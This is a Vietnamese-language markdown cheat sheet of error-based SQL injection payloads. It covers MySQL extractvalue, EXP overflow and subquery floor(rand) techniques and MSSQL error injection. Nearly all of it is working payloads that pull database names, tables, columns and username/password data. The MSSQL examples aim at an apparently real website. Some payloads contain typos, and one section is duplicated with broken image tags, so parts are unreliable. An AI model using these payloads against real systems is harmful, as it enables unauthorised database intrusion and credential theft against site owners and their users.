#các lỗi chi tiết jnection

- [Error Based Injection using Extractvalue](#1)
- [MSSQL Error Based Injection](#2)
- [Error Based SQL Injection Using EXP](#3)
- [Error Based Injection SubQuery Injection](#4)


<a name="1"></a>
##Error Based Injection using Extractvalue

###:1 số cú pháp khai thác 
- **Get verion:** `and extractvalue(0x7e,concat(0x7e,vesion()))-- -`

- **get database name:**`and extractvalue(0x7e,concat(0x7e,database()))-- -`

- **get table name:** 
```
and extractvalue(0x7e,(select concat(table_name) from information_chema.tables where table_chema=database() limit 0,1))-- -
```

 với limit n,1 ,n số thực chúng ta tăng giá trị cho tới khi tìm đc table

- **get column from table:**
```
and extractvalue(0x3a,concat(0x3a,(select concat(column_name) from information_schema.columns where table_name=0xTABLEHEX limit 0,1)))
```


với TableHex ở đây là mã hex

- **Get data  from Column:**

```
and extractvalue(0x3a,concat(0x3a,(select concat(COLUMN_NAME,0x3a,0x7e,COLUMN_NAME) from TABLE_NAME limit 0,1)))-- -
```
**note**
 1.     COLUMN_NAME: where you insert the column name you want to extract information from

        2.     TABLENAME: where you insert the table name of the column names you extracted from


ví dụ
```
www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))-- -
```
- ** 1 số lệnh khác**

**Insert**
```

INSERT INTO users (id, username, password) VALUES (2,'Olivia' or
extractvalue(1,concat(0x7e,database())) or'', 'Nervo');
-->ERROR 1105 (HY000): XPATH syntax error: '~newdb'
```

**Update**
```
UPDATE users SET password='Nicky' or extractvalue(1,concat(0x7e,database())) or''
WHERE id=2 and username='Nervo';

-->ERROR 1105 (HY000): XPATH syntax error: '~newdb'

```
**Delete**
```
DELETE FROM users WHERE id=1 or extractvalue(1,concat(0x7e,database())) or'';
-->ERROR 1105 (HY000): XPATH syntax error: '~newdb'
```
<a name="2"></a>
##MSSQL Error Based Injection

- thêm dấu \' để check lỗi

<img src="http://image.prntscr.com/image/c8982e8bcd6d4a67942ecfce5cd53db8.png>

#MSSQL Error Based Injection

- thêm dấu \' để check lỗi

<img src="http://image.prntscr.com/image/c8982e8bcd6d4a67942ecfce5cd53db8.png


- lấy thông tin database 
```
http://www.timescanindia.in/Product.aspx?Id=7 and 1=db_name()--
```

- lấy thông tin version
```
http://www.timescanindia.in/Product.aspx?Id=7 and @@version=1--
``` 

- lấy thông tin table colum
```
 and (select output from err_dios)=1

hoặc
and 1=(select+table_name%2b'::'%2bcolumn_name as t+from+information_schema.columns FOR XML PATH(''))--
```

- lấy nhiều bảng và cột
```
AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy ' ' name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END;




vd:
table1:column1
table1:column2
table1:column3
table2:column1
table2:column2
table2:column3
table3:column1

```
<img src="http://image.prntscr.com/image/57eadece342147308d2a570eed8f7675.png">




<a name="3"></a>
##Error Based SQL Injection Using 

- là lỗi tràn dữ liệu trong sql 

#### cách lấy thông tin

lấy tên bảng:


`select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));`
lấy tên cột:


`select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));`
lấy dữ liệu:


`select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));`

lấy tất cả các bảng và cột 

```
exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))
```
https://whitehat.vn/forum/thao-luan/web-security/7938-sql-injection-khai-thac-error-based-sql-injection

<a name="4"></a>
##Error Based Injection SubQuery Injection

- Truy xuất database version:

```
 AND(SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
```

- Truy xuất database names:
```
1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.schemata GROUP BY a LIMIT 0,1)b)--
```
- Truy xuất table names:
```
AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.TABLES GROUP BY a LIMIT 0,1)b)--
```

- Truy xuất column names:
```
1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b)--
```
- Truy xuất data:
```
 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT column1 FROM table1 LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
```
- Truy xuất data từ một database khác:
```
AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT column1 FROM database2.table1 LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
```

